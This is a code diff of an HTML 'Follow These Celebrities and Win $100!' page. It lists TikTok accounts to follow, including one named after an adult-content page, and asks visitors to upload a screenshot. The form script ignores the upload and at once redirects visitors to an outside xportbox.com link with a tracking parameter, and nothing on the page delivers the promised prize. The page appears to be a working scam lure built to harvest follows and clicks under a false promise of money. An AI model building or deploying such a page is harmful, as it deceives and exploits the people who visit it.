@@ -7,58 +7,71 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #000; /* Black background */
-            color: #00f; /* Blue text */
+            background-color: #000;
+            color: #00f;
             text-align: center;
             padding: 20px;
         }
-        #submitButton {
-            display: none; /* Hidden by default */
-            margin-top: 20px;
+        .celebrity-item {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .celebrity-item span {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        .follow-button {
             background-color: #ff0000; /* Red button */
             color: #fff; /* White text */
             border: none;
-            padding: 10px 20px;
+            padding: 8px 12px;
             font-size: 16px;
             cursor: pointer;
-        }
-        #celebrity-list {
-            list-style: none;
-            padding: 0;
-        }
-        #celebrity-list li {
-            margin: 10px 0;
+            text-decoration: none;
+            border-radius: 5px;
         }
         a {
-            color: #00f; /* Blue links */
+            color: #00f;
             text-decoration: none;
-        }
-        a:hover {
-            text-decoration: underline; /* Underline links on hover */
         }
     </style>
 </head>
 <body>
     <h1>Follow These Celebrities and Win $100!</h1>
     <p>Follow the celebrities listed below:</p>
-    
-    <ul id="celebrity-list">
-        <li><a href="https://www.tiktok.com/@davido?_t=8qykETg4vaA&_r=1">David</a></li>
-        <li><a href="https://www.tiktok.com/@keithubarnonlyfanspage">Keitubarnonlyfanspage</a></li>
-        <li><a href="https://www.tiktok.com/@therock">Dwayne Johnson</a></li>
-        <li><a href="https://www.tiktok.com/@willsmith">Will Smith</a></li>
-        <li><a href="https://www.tiktok.com/@selenagomez">Selena Gomez</a></li>
-        <li><a href="https://www.tiktok.com/@zoesugg">Zoe Sugg</a></li>
-        <li><a href="https://www.tiktok.com/@charlidamelio">Charli D'Amelio</a></li>
-        <li><a href="https://www.tiktok.com/@bellapoarch">Bella Poarch</a></li>
-        <li><a href="https://www.tiktok.com/@addisonrae">Addison Rae</a></li>
-        <li><a href="https://www.tiktok.com/@lorengray">Loren Gray</a></li>
-        <li><a href="https://www.tiktok.com/@jadenhossler">Jaden Hossler</a></li>
-        <li><a href="https://www.tiktok.com/@bellathorne">Bella Thorne</a></li>
-        <li><a href="https://www.tiktok.com/@lizakoshy">Liza Koshy</a></li>
-        <li><a href="https://www.tiktok.com/@lilly">Lily Singh</a></li>
-        <li><a href="https://www.tiktok.com/@calebosky1">Caleb Osoky</a></li>
-    </ul>
+
+    <div id="celebrity-list">
+        <div class="celebrity-item">
+            <span>Calebosky1</span>
+            <a href="https://www.tiktok.com/@calebosky1" target="_blank" class="follow-button">Follow</a>
+        </div>
+        <div class="celebrity-item">
+            <span>Keithubarnonlyfanspage</span>
+            <a href="https://www.tiktok.com/@keithubarnonlyfanspage" target="_blank" class="follow-button">Follow</a>
+        </div>
+        <div class="celebrity-item">
+            <span>Davido</span>
+            <a href="https://www.tiktok.com/@davido" target="_blank" class="follow-button">Follow</a>
+        </div>
+        <div class="celebrity-item">
+            <span>Dwayne Johnson</span>
+            <a href="https://www.tiktok.com/@therock" target="_blank" class="follow-button">Follow</a>
+        </div>
+        <div class="celebrity-item">
+            <span>Will Smith</span>
+            <a href="https://www.tiktok.com/@willsmith" target="_blank" class="follow-button">Follow</a>
+        </div>
+        <div class="celebrity-item">
+            <span>Selena Gomez</span>
+            <a href="https://www.tiktok.com/@selenagomez" target="_blank" class="follow-button">Follow</a>
+        </div>
+        <div class="celebrity-item">
+            <span>Zoe Sugg</span>
+            <a href="https://www.tiktok.com/@zoesugg" target="_blank" class="follow-button">Follow</a>
+        </div>
+    </div>
 
     <form id="submissionForm">
         <label for="screenshot">Upload your screenshot:</label>
@@ -69,12 +82,8 @@
     <script>
         document.getElementById("submissionForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent the default form submission
-            redirectToUrl(); // Redirect to the specified URL immediately
+            window.location.href = "http://xportbox.com/XU/VI?nox=7277082848"; // Redirect to specified URL
         });
-
-        function redirectToUrl() {
-            window.location.href = "http://xportbox.com/XU/VI?nox=7277082848"; // Redirect to the specified URL
-        }
     </script>
 </body>
 </html>
